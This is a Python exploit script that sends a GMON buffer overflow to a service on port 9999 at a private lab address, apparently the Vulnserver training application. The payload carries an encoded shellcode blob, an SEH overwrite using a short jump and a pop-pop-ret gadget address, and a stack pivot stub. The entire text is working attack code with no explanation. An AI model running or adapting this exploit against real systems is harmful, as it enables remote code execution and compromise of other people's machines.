#!/usr/bin/python

import socket
import os
import sys
import struct

host = "10.0.2.6"
port = 9999

total = 5000
totalbuffer = 3495
header = "GMON /.:/"
buffer = "\x90" * 11
buffer += ("\xb8\x62\xf6\x36\x23\xda\xc1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x83\xea\xfc\x31\x42\x0e\x03\x20\xf8\xd4\xd6\x58\xec\x9b"
"\x19\xa0\xed\xfb\x90\x45\xdc\x3b\xc6\x0e\x4f\x8c\x8c\x42\x7c"
"\x67\xc0\x76\xf7\x05\xcd\x79\xb0\xa0\x2b\xb4\x41\x98\x08\xd7"
"\xc1\xe3\x5c\x37\xfb\x2b\x91\x36\x3c\x51\x58\x6a\x95\x1d\xcf"
"\x9a\x92\x68\xcc\x11\xe8\x7d\x54\xc6\xb9\x7c\x75\x59\xb1\x26"
"\x55\x58\x16\x53\xdc\x42\x7b\x5e\x96\xf9\x4f\x14\x29\x2b\x9e"
"\xd5\x86\x12\x2e\x24\xd6\x53\x89\xd7\xad\xad\xe9\x6a\xb6\x6a"
"\x93\xb0\x33\x68\x33\x32\xe3\x54\xc5\x97\x72\x1f\xc9\x5c\xf0"
"\x47\xce\x63\xd5\xfc\xea\xe8\xd8\xd2\x7a\xaa\xfe\xf6\x27\x68"
"\x9e\xaf\x8d\xdf\x9f\xaf\x6d\xbf\x05\xa4\x80\xd4\x37\xe7\xcc"
"\x19\x7a\x17\x0d\x36\x0d\x64\x3f\x99\xa5\xe2\x73\x52\x60\xf5"
"\x74\x49\xd4\x69\x8b\x72\x25\xa0\x48\x26\x75\xda\x79\x47\x1e"
"\x1a\x85\x92\xb1\x4a\x29\x4d\x72\x3a\x89\x3d\x1a\x50\x06\x61"
"\x3a\x5b\xcc\x0a\xd1\xa6\x87\x3e\x26\xaa\x52\x57\x24\xaa\x5d"
"\x1c\xa1\x4c\x37\x72\xe4\xc7\xa0\xeb\xad\x93\x51\xf3\x7b\xde"
"\x52\x7f\x88\x1f\x1c\x88\xe5\x33\xc9\x78\xb0\x69\x5c\x86\x6e"
"\x05\x02\x15\xf5\xd5\x4d\x06\xa2\x82\x1a\xf8\xbb\x46\xb7\xa3"
"\x15\x74\x4a\x35\x5d\x3c\x91\x86\x60\xbd\x54\xb2\x46\xad\xa0"
"\x3b\xc3\x99\x7c\x6a\x9d\x77\x3b\xc4\x6f\x21\x95\xbb\x39\xa5"
"\x60\xf0\xf9\xb3\x6c\xdd\x8f\x5b\xdc\x88\xc9\x64\xd1\x5c\xde"
"\x1d\x0f\xfd\x21\xf4\x8b\x0d\x68\x54\xbd\x85\x35\x0d\xff\xcb"
"\xc5\xf8\x3c\xf2\x45\x08\xbd\x01\x55\x79\xb8\x4e\xd1\x92\xb0"
"\xdf\xb4\x94\x67\xdf\x9c")
buffer += "\x41" * (totalbuffer - len(buffer))
# jmp ebp at 0x625011f9
# nseh = struct.pack('<I',0x625011f9)
# nseh = "\x42" * 4
# replace nseh with jumpcode
nseh = "\xeb\x06\x90\x90"
# nseh = "\xeb\x06\x90\x90"
# pop pop ret at 0x625011b3
# seh = "\x43" * 4
seh = struct.pack('<I',0x625011b3)
boop = "\x54" #push esp
boop += "\x58" # pop eax
boop += "\x66\x05\xf0\x03" # add ax,0x3f0
boop += "\xff\xe0" # jmp eax
morejunk = "\x44" * (total - totalbuffer - len(nseh) - len(nseh) -len(boop))

payload = header + buffer + nseh + seh + boop + morejunk

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

print s.recv(1024)
print "[+] Sending exploit..."
print "[+) With buffer length : " + str(len(buffer))
s.send(payload)
print s.recv(1024)
s.close()
